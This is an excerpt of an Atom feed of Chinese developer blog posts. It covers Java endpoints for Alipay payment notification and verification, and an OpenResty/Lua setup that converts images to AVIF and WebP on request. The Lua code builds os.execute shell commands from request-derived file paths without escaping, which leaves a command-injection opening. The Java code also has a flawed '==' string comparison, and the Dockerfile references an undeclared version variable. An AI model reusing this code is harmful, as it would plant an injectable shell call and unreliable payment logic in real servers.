class="comment">// 通知时间</span></span><br><span class="line">    <span class="keyword">private</span> String notifyTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订单生成时间</span></span><br><span class="line">    <span class="keyword">private</span> String createTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 付款时间</span></span><br><span class="line">    <span class="keyword">private</span> String payTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 退款时间</span></span><br><span class="line">    <span class="keyword">private</span> String refundTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订单结束时间</span></span><br><span class="line">    <span class="keyword">private</span> String closeTime;</span><br><span class="line">  </span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是 response.getBody() 就是加密后的订单字符串，可以直接返回给 App 端进行使用。</p><h3 id="接口-2：支付宝服务端异步通知"><a href="#接口-2：支付宝服务端异步通知" class="headerlink" title="接口 2：支付宝服务端异步通知"></a>接口 2：支付宝服务端异步通知</h3><p><strong>功能</strong></p><ul><li><p>通过异步通知更新支付宝订单信息。</p></li><li><p>防止订单丢失，即页面跳转同步通知没有处理订单更新，它则去处理。</p></li></ul><p><strong>注意</strong></p><ul><li>只有在支付宝的交易管理中存在该笔交易，且发生了交易状态的改变，支付宝才会通过该方式发起服务器通知。</li><li>第一次交易状态改变（即时到账中此时交易状态是交易完成）时，不仅会返回同步处理结果，而且服务器异步通知页面也会收到支付宝发来的处理结果通知。</li></ul><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/asyn"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getAsynResult</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> AlipayApiException </span>&#123;</span><br><span class="line">  <span class="comment">//获取支付宝POST过来反馈信息</span></span><br><span class="line">  Map&lt;String,String&gt; params = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">  Map requestParams = request.getParameterMap();</span><br><span class="line">  <span class="keyword">for</span> (Iterator iter = requestParams.keySet().iterator(); iter.hasNext();) &#123;</span><br><span class="line">    String name = (String) iter.next();</span><br><span class="line">    String[] values = (String[]) requestParams.get(name);</span><br><span class="line">    String valueStr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; values.length; i++) &#123;</span><br><span class="line">      valueStr = (i == values.length - <span class="number">1</span>) ? valueStr + values[i]</span><br><span class="line">        : valueStr + values[i] + <span class="string">","</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//乱码解决，这段代码在出现乱码时使用。</span></span><br><span class="line">    <span class="comment">//valueStr = new String(valueStr.getBytes("ISO-8859-1"), "utf-8");</span></span><br><span class="line">    params.put(name, valueStr);</span><br><span class="line">    logger.info(name+<span class="string">" "</span>+valueStr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//切记alipaypublickey是支付宝的公钥，请去open.alipay.com对应应用下查看。</span></span><br><span class="line">  <span class="comment">//boolean AlipaySignature.rsaCertCheckV1(Map&lt;String, String&gt; params, String publicKeyCertPath, String charset,String signType)</span></span><br><span class="line">  <span class="comment">//调用SDK验证签名</span></span><br><span class="line">  <span class="keyword">boolean</span> flag = AlipaySignature.rsaCertCheckV1(params, alipayPublicCertPath, <span class="string">"UTF-8"</span>,<span class="string">"RSA2"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">    <span class="comment">//获取商户之前传给支付宝的订单号（商户系统的唯一订单号）</span></span><br><span class="line">    String outTradeNo = params.get(<span class="string">"out_trade_no"</span>);</span><br><span class="line">    <span class="comment">//订单金额:本次交易支付的订单金额，单位为人民币（元）</span></span><br><span class="line">    String totalAmount=params.get(<span class="string">"total_amount"</span>);</span><br><span class="line">    <span class="comment">//卖家支付宝用户号</span></span><br><span class="line">    String sellerId=params.get(<span class="string">"seller_id"</span>);</span><br><span class="line">    <span class="comment">//支付宝分配给开发者的应用Id</span></span><br><span class="line">    String appId=params.get(<span class="string">"app_id"</span>);</span><br><span class="line">    <span class="comment">//获取交易状态</span></span><br><span class="line">    String tradeStatus = params.get(<span class="string">"trade_status"</span>);</span><br><span class="line">    <span class="comment">//通知时间:yyyy-MM-dd HH:mm:ss</span></span><br><span class="line">    String notifyTime=params.get(<span class="string">"notify_time"</span>);</span><br><span class="line">    <span class="comment">//交易创建时间:yyyy-MM-dd HH:mm:ss</span></span><br><span class="line">    String gmtCreate=params.get(<span class="string">"gmt_create"</span>);</span><br><span class="line">    <span class="comment">//交易付款时间</span></span><br><span class="line">    String gmtPayment=params.get(<span class="string">"gmt_payment"</span>);</span><br><span class="line">    <span class="comment">//交易退款时间</span></span><br><span class="line">    String gmtRefund=params.get(<span class="string">"gmt_refund"</span>);</span><br><span class="line">    <span class="comment">//交易结束时间</span></span><br><span class="line">    String gmtClose=params.get(<span class="string">"gmt_close"</span>);</span><br><span class="line"></span><br><span class="line">    AlipaymentOrder alipaymentOrder = alipaymentOrderService.selectAlipaymentOrder(outTradeNo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//支付宝官方建议校验的值（out_trade_no、total_amount、sellerId、app_id）</span></span><br><span class="line">    <span class="keyword">if</span> (alipaymentOrder != <span class="keyword">null</span> &amp;&amp; totalAmount.equals(String.valueOf(alipaymentOrder.getAmount())) &amp;&amp; app_id.equals(appId)) &#123;</span><br><span class="line">      <span class="comment">// 更新时间相关的值</span></span><br><span class="line">      alipaymentOrder.setNotifyTime(notifyTime);</span><br><span class="line">      alipaymentOrder.setCreateTime(gmtCreate);</span><br><span class="line">      alipaymentOrder.setPayTime(gmtPayment);</span><br><span class="line">      alipaymentOrder.setRefundTime(gmtRefund);</span><br><span class="line">      alipaymentOrder.setCloseTime(gmtClose);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 判断交易结果</span></span><br><span class="line">      <span class="keyword">switch</span> (tradeStatus)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"TRADE_FINISHED"</span>: <span class="comment">// 交易结束并不可退款</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">3</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"TRADE_SUCCESS"</span>: <span class="comment">// 交易支付成功</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">2</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"TRADE_CLOSED"</span>: <span class="comment">// 未付款交易超时关闭或支付完成后全额退款</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"WAIT_BUYER_PAY"</span>: <span class="comment">// 交易创建并等待买家付款</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      alipaymentOrderService.updateAlipaymentOrder(alipaymentOrder);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (tradeStatus.equals(<span class="string">"TRADE_SUCCESS"</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//                return AjaxResult.success("验证签名成功但订单未成功支付");</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//            return AjaxResult.error("支付宝官方建议校验的值（out_trade_no、total_amount、sellerId、app_id）不一致！");</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//        return AjaxResult.error("验证签名失败！");</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">"fail"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意按照支付宝要求，返回的必须是字符串 “success” 或 “fail”。</p><h3 id="接口-3：最终付款校验"><a href="#接口-3：最终付款校验" class="headerlink" title="接口 3：最终付款校验"></a>接口 3：最终付款校验</h3><p><strong>功能</strong></p><p>最终支付结果必须通过这个接口进行校验。</p><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/check"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> AjaxResult <span class="title">check</span><span class="params">(@RequestParam String outTradeNo)</span> <span class="keyword">throws</span> AlipayApiException, ParseException </span>&#123;</span><br><span class="line">    <span class="comment">//构造client</span></span><br><span class="line">    CertAlipayRequest certAlipayRequest = <span class="keyword">new</span> CertAlipayRequest();</span><br><span class="line">    <span class="comment">//设置网关地址</span></span><br><span class="line">    certAlipayRequest.setServerUrl(<span class="string">"https://openapi.alipay.com/gateway.do"</span>);</span><br><span class="line">    <span class="comment">//设置应用Id</span></span><br><span class="line">    certAlipayRequest.setAppId(app_id);</span><br><span class="line">    <span class="comment">//设置应用私钥</span></span><br><span class="line">    certAlipayRequest.setPrivateKey(privateKey);</span><br><span class="line">    <span class="comment">//设置请求格式，固定值json</span></span><br><span class="line">    certAlipayRequest.setFormat(<span class="string">"json"</span>);</span><br><span class="line">    <span class="comment">//设置字符集</span></span><br><span class="line">    certAlipayRequest.setCharset(<span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="comment">//设置签名类型</span></span><br><span class="line">    certAlipayRequest.setSignType(<span class="string">"RSA2"</span>);</span><br><span class="line">    <span class="comment">//设置应用公钥证书路径</span></span><br><span class="line">    certAlipayRequest.setCertPath(certPath);</span><br><span class="line">    <span class="comment">//设置支付宝公钥证书路径</span></span><br><span class="line">    certAlipayRequest.setAlipayPublicCertPath(alipayPublicCertPath);</span><br><span class="line">    <span class="comment">//设置支付宝根证书路径</span></span><br><span class="line">    certAlipayRequest.setRootCertPath(rootCertPath);</span><br><span class="line">    <span class="comment">//构造client</span></span><br><span class="line">    AlipayClient alipayClient = <span class="keyword">new</span> DefaultAlipayClient(certAlipayRequest);</span><br><span class="line"></span><br><span class="line">    AlipayTradeQueryRequest alipayTradeQueryRequest = <span class="keyword">new</span> AlipayTradeQueryRequest();</span><br><span class="line">    alipayTradeQueryRequest.setBizContent(<span class="string">"&#123;"</span> +</span><br><span class="line">            <span class="string">"\"out_trade_no\":\""</span>+outTradeNo+<span class="string">"\""</span> +</span><br><span class="line">            <span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    AlipayTradeQueryResponse alipayTradeQueryResponse = alipayClient.certificateExecute(alipayTradeQueryRequest);</span><br><span class="line">    <span class="keyword">if</span>(alipayTradeQueryResponse.isSuccess())&#123;</span><br><span class="line">        AlipaymentOrder alipaymentOrder=alipaymentOrderService.selectAlipaymentOrder(outTradeNo);</span><br><span class="line">        EOrder eOrder=eOrderService.selectEOrderByOrderSn(outTradeNo);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改数据库支付宝订单表</span></span><br><span class="line">        alipaymentOrder.setAmount(Double.parseDouble(alipayTradeQueryResponse.getTotalAmount()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断交易结果</span></span><br><span class="line">        <span class="keyword">switch</span> (alipayTradeQueryResponse.getTradeStatus())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"TRADE_FINISHED"</span>: <span class="comment">// 交易结束并不可退款</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">3</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"TRADE_SUCCESS"</span>: <span class="comment">// 交易支付成功</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"TRADE_CLOSED"</span>: <span class="comment">// 未付款交易超时关闭或支付完成后全额退款</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"WAIT_BUYER_PAY"</span>: <span class="comment">// 交易创建并等待买家付款</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        alipaymentOrderService.updateAlipaymentOrder(alipaymentOrder);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果支付成功，更新订单</span></span><br><span class="line">        <span class="keyword">if</span>(alipayTradeQueryResponse.getTradeStatus()==<span class="string">"TRADE_SUCCESS"</span>)&#123;</span><br><span class="line">            eOrder.setOrderStatus(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            String payTime=alipaymentOrder.getPayTime();</span><br><span class="line">            SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">            Date date=simpleDateFormat.parse(payTime);</span><br><span class="line">            eOrder.setPayTime(date);</span><br><span class="line"></span><br><span class="line">            eOrderMapper.updateEOrder(eOrder);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保险订单</span></span><br><span class="line">            <span class="keyword">if</span> (eOrder.getOrderType() == <span class="number">1</span>) &#123;</span><br><span class="line">                EInsuranceOrder eInsuranceOrder=eInsuranceOrderMapper.selectEInsuranceOrderByOrderSn(outTradeNo);</span><br><span class="line">                eInsuranceOrder.setOrderStatus(<span class="number">1</span>);</span><br><span class="line">                eInsuranceOrder.setPayTime(date);</span><br><span class="line"></span><br><span class="line">                eInsuranceOrderMapper.updateEInsuranceOrder(eInsuranceOrder);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> AjaxResult.success(alipaymentOrder);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">"调用支付宝查询接口失败！"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个接口可以加上支付成功后的订单逻辑。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这类通过第三方接口进行开发的工作，基本流程也就是上述这样，主要问题还是出在官方文档与实际操作的不符，这就需要 1.仔细阅读官方文档和理解示例代码 2.多打断点调试和看日志的输出情况。</p><p>比较重要的点是要和自己项目的业务逻辑结合，知道该把自己的代码安插在哪个位置。</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://blog.csdn.net/Ouyzc/article/details/79551714" target="_blank" rel="noopener">https://blog.csdn.net/Ouyzc/article/details/79551714</a></p>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/use-openresty-to-optimize-image-size-with-avif-and-webp.html</id>
        <title><![CDATA[使用 OpenResty 无痛优化图片体积（AVIF / WebP）]]></title>
        <updated>2020-09-20T09:12:00+08:00</updated>
        <link href="https://blog.rexskz.info/use-openresty-to-optimize-image-size-with-avif-and-webp.html"/>
        <content type="text/html" src="https://blog.rexskz.info/use-openresty-to-optimize-image-size-with-avif-and-webp.html"><![CDATA[<h1>图片体积优化计划</h1><p>两年半之前，我第一次了解到 WebP 可以有效减少图片体积的时候，有一瞬间产生了“把网站中所有资源替换成 WebP”的冲动，但当我打开 caniuse 的时候，发现 Safari 迟迟不支持，况且网站中涉及到图片的地方实在是太多，修改代码不太现实。</p><p>我当时搜了一些资料，是关于让 Nginx 针对浏览器提供的 Accept 头来分别提供不同格式的文件。这个方法确实有，然而我实在是太懒了，以至于写一段命令将所有图片转个格式都不想写，并且想到以后所有图片都要提供两个版本，实在是太麻烦了！于是这个计划就被搁置了。</p><p>后来我更多的接触了 OpenResty，这是一个集成了 Lua 的 Nginx，可以利用 Lua 脚本来方便的做一些扩展。我还摸索出了如何利用 Lua FFI 调用 OpenCC API 无痛让网站支持了繁体版本。既然 FFI 都能支持，那么如果发现浏览器支持 WebP，则调用一个 <code>cwebp</code> 命令转换图片格式并返回，不是更好实现了？不过我的服务器已经完全 Docker 化，OpenResty 是使用了现成的 <a href="https://github.com/hustshawn/openresty-opencc-docker">hustshawn/openresty-opencc-docker</a>，如果想安装 <code>cwebp</code> 进去，需要修改 Dockerfile，因此这个计划又被懒惰的我给搁置了。</p><p>直到前两天，我无意间看到了这样一篇文章：<a href="https://jakearchibald.com/2020/avif-has-landed/">AVIF has landed</a>，里面提到了一个新的图片格式：AVIF，文章里提供了很多例子，看起来压缩率和效果都 WebP 要好。这激起了我的兴趣，想试一下能否为支持 AVIF 的浏览器提供 AVIF 的图片。</p><p>当然，由于 AVIF 的浏览器支持率实在是太低（据说很快会高起来），于是我还是需要顺便提供一个 WebP 的转换。</p><p>于是计划正式开始！</p><h1>将 AVIF 与 WebP 转换器打包进 Docker</h1><p>之前我为了升级 OpenCC 版本，自己 Fork 了一下 hustshawn 的镜像：<a href="https://github.com/RexSkz/openresty-opencc-docker">RexSkz/openresty-opencc-docker</a>，刚好在这个上面做修改。我要做的就是将 AVIF 和 WebP 相关的程序打包进去。</p><p>WebP 很简单，用 <code>cwebp</code> 就可以了，我用的 OpenResty 镜像是基于 Alpine 的，因此需要找到在 Alpine 下面安装 <code>cwebp</code> 的方法。在 <a href="https://pkgs.alpinelinux.org/contents?file=cwebp">Alpine Package</a> 中搜索 <code>cwebp</code>，发现需要安装 <code>libwebp-tools</code>，于是在 Dockerfile 中添加了一句：</p><pre><code class="lang-dockerfile">RUN apk add libwebp-tools</code></pre><p>至于 AVIF 的部分，我找到了一个 <a href="https://github.com/Kagami/go-avif">Kagami/go-avif</a> 项目。这个项目提供了 Linux 环境的二进制可执行文件，我可以直接用 <code>curl</code> 在 Build 的时候下载到镜像中，但还需要安装 <code>libaom-dev</code>，我搜了一下，并没有发现相关的包，于是只能 Google 了一下 <code>alpine libaom-dev</code> 关键字，发现了 <a href="https://pkgs.org/search/?q=libaom-dev">这样一个网站</a>，但里面只有 Debian 的数据，没有 Alpine……</p><p>熟悉 Linux 的小伙伴可能会知道，<code>libaom-dev</code> 最核心的部分应当是 <code>aom</code>，之前的 <code>lib</code> 表示是一个库，<code>-dev</code> 表示这会带上一些必要的 C 语言头文件。于是我在网站搜索框里搜索 <code>aom</code>，发现了一个叫 <code>aom-dev</code> 的包，应该是符合要求的，但需要至少 Alpine 3.12，因此我不得不升级了 OpenResty 镜像版本。最终跟 AVIF 相关的部分如下：</p><pre><code class="lang-dockerfile">FROM openresty/openresty:1.17.8.2-5-alpine

ARG AOM_VERSION=&quot;v1.0.0&quot;

# Alpine 是没有 curl 的，这个也要自己安装
RUN apk add aom-dev curl \
    &amp;&amp; curl -L https://github.com/Kagami/go-avif/releases/download/${GO_AVIF_VERSION}/avif-linux-x64 &gt; /usr/bin/avif \
    &amp;&amp; chmod +x /usr/bin/avif \
    &amp;&amp; rm -rf /var/cache/apk/*</code></pre><p>将 Dockerfile 推到 GitHub，触发了 Docker Hub 的自动构建。当构建完成后，我在本地输入了这两条命令：</p><pre><code class="lang-text">$ docker pull rexskz/openresty-opencc-docker
$ docker-compose -f local.yaml up -d nginx</code></pre><p>然后我又上 Portainer 的 Shell 中看了一下，<code>cwebp</code> 和 <code>avif</code> 两个命令都已经可以使用，并可以转换文件了。</p><h1>使用 OpenResty 转换图片并返回</h1><p>由于我对 Lua 和 OpenResty 还没有那么熟悉，于是还是得参考网上大佬们写的 OpenResty 配置 WebP 的文章，例如 <a href="https://mikublog.com/tech/2090">这篇</a>。关键代码如下：</p><pre><code class="lang-lua">-- 作者假定我们访问 xxx.jpg.webp
-- 才会返回 WebP 格式
local newFile = ngx.var.request_filename
local originalFile = newFile:sub(1, #newFile - 5)

-- 如果源文件不存在，直接报 404
if not fileExists(originalFile) then
    ngx.exit(404)
    return
end

-- 转换格式，生成新文件
os.execute(&quot;cwebp -q 75 &quot; .. originalFile .. &quot; -o &quot; .. newFile)

-- 如果转换成功则返回新文件，否则报 404
if not fileExists(newFile) then
    ngx.exit(404)
    return
end
ngx.exec(ngx.var.uri)</code></pre><p>我稍加改动，又封装了几个函数，便使它支持了 AVIF，并且在已有转换结果的时候不会重复转换：</p><pre><code class="lang-lua">-- 当 Accept 中有 image/avif 时才转换
if string.find(ngx.req.get_headers()[&quot;accept&quot;], &quot;image/avif&quot;) ~= nil then
    local newFile = originalFile .. &quot;.converted.avif&quot;
    -- 首先尝试 serve 新文件，如果没有才会做转换
    if not tryServeFile(newFile, &quot;image/avif&quot;) then
        os.execute(&quot;avif -e &quot; .. originalFile .. &quot; -o &quot; .. newFile .. &quot; --best -q 12&quot;);
        serveFileOr404(newFile, &quot;image/avif&quot;)
    end
end
-- WebP 的配置类似，就不重复写了</code></pre><p>最后我还不忘把 <code>*.converted.avif</code> 和 <code>*.converted.webp</code> 加入了 <code>.gitignore</code>，简直 Perfect！</p><h1>转换的效果如何呢？</h1><p>我打开本地的网站试了一下，发现一张 Banner 图片就等了十几秒，大部分时间都花在转换上了……我可是用的外星人啊！</p><p><img src="https://static.rexskz.info/blog/article/qiaoqiaohua/keng-die-ne.gif" alt="这不是坑爹吗！" title="这不是坑爹吗！"></p><p>没关系，大不了之后我每次上传图片，都触发一下自动转换，然后再把页面公开化就好了。那么 AVIF 的压缩率有多少呢？</p><p>我去目录下 <code>ls</code> 之后发现：对于 Banner 这种 JPG 格式压缩率还是挺高的，能在之前 75% 的基础上几乎无损的再压缩一半体积；但对于 PNG 文件来说，由于我需要保证图片不失真，因此选择了无损压缩，结果一个 1.2 KB 的图标硬是被压缩成了 2 KB……</p><p><img src="https://static.rexskz.info/blog/article/qiaoqiaohua/keng-die-ne.gif" alt="这不是坑爹吗！" title="这不是坑爹吗！"></p><p>难道 AVIF 的无损压缩率其实并没有想象中的好？我又搜了一圈，发现了一个 <a href="https://docs.google.com/spreadsheets/d/1TE5iLE08oV90EqOmFHnzBLwiPtQSs1XAvI3QfoMgKQM/edit#gid=0">Google 表格</a>，里面是 WebP 与 AVIF 的无损压缩对比。数据表明，在一半以上的情况下，AVIF 的无损压缩会让图片体积增大，甚至经常能达到两三倍！</p><p>得了，我用于无损的 PNG 就不要考虑转换为 AVIF 了，又慢体积还大。</p><h1>最终的效果与代码</h1><p>部署到服务器上之后，我发现，一直在提示 404。看了 Nginx 的 Log 才发现，由于 Docker 权限的原因，无法将生成的图片写入到目标路径。修复了一下权限问题后，图片终于显示了出来。</p><p><img src="https://static.rexskz.info/blog/article/use-openresty-to-optimize-image-size-with-avif-and-webp/0.png" alt="可以看到图片的 Type 已经变成了 webp 和 avif" title="可以看到图片的 Type 已经变成了 webp 和 avif"></p><p>既然都调通了，就放出来造福一下大众吧。不过写的比较冗余，也没有太多优化。</p><pre><code class="lang-nginx">location ~ \.(jpe?g|png|gif)$ {
    # convert using lua code
    content_by_lua_file /etc/nginx/conf.d/image-convert.lua;
}</code></pre><pre><code class="lang-lua">function tryServeFile(name, contentType)
    if fileExists(name) then
        local f = io.open(name, &quot;rb&quot;)
        local content = f:read(&quot;*all&quot;)
        f:close()
        if contentType ~= &quot;&quot; then
            ngx.header[&quot;Content-Type&quot;] = contentType
        end
        ngx.print(content)
        return true
    end
    return false
end

function serveFileOr404(name, contentType)
    if not tryServeFile(name, contentType) then
        ngx.exit(404)
    end
end

-- According to https://docs.google.com/spreadsheets/d/1TE5iLE08oV90EqOmFHnzBLwiPtQSs1XAvI3QfoMgKQM/edit#gid=0
-- not all formats should be converted to avif because it may have larger file size

if string.find(originalFile, &quot;.png&quot;) ~= nil then
    -- for PNG (lossless) we only try to use lossless webp
    if string.find(ngx.req.get_headers()[&quot;accept&quot;], &quot;image/webp&quot;) ~= nil then
        local newFile = originalFile .. &quot;.converted.webp&quot;
        if not tryServeFile(newFile, &quot;image/webp&quot;) then
            os.execute(&quot;cwebp -q 100 -lossless &quot; .. originalFile .. &quot; -o &quot; .. newFile);
            serveFileOr404(newFile, &quot;image/webp&quot;)
        end
    else
        serveFileOr404(originalFile, &quot;&quot;)
    end
else
    -- for other formats, we first try to use avif, then webp
    if string.find(ngx.req.get_headers()[&quot;accept&quot;], &quot;image/avif&quot;) ~= nil then
        local newFile = originalFile .. &quot;.converted.avif&quot;
        if not tryServeFile(newFile, &quot;image/avif&quot;) then
            os.execute(&quot;avif -e &quot; .. originalFile .. &quot; -o &quot; .. newFile .. &quot; --best -q 12&quot;);
            serveFileOr404(newFile, &quot;image/avif&quot;)
        end
    elseif string.find(ngx.req.get_headers()[&quot;accept&quot;], &quot;image/webp&quot;) ~= nil then
        local newFile = originalFile .. &quot;.converted.webp&quot;
        if not tryServeFile(newFile, &quot;image/webp&quot;) then
            os.execute(&quot;cwebp -q 80 &quot; .. originalFile .. &quot; -o &quot; .. newFile);
            serveFileOr404(newFile, &quot;image/webp&quot;)
        end
    else
        serveFileOr404(originalFile, &quot;&quot;)
    end
end</code></pre><h1>参考资料</h1><ul><li><a href="https://jakearchibald.com/2020/avif-has-landed/">AVIF has landed - JakeArchibald.com</a></li><li><a href="https://mikublog.com/tech/2090">通过 Nginx-Lua 自动转换图片为 WebP 格式 - MikuBlog</a></li><li><a href="https://pkgs.org/search/?q=aom-dev">Search Results for aom-dev</a></li><li><a href="https://docs.google.com/spreadsheets/d/1TE5iLE08oV90EqOmFHnzBLwiPtQSs1XAvI3QfoMgKQM/edit#gid=0">AVIF test results - Google 表格</a></li></ul>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2020/09/using-beancount/</id>
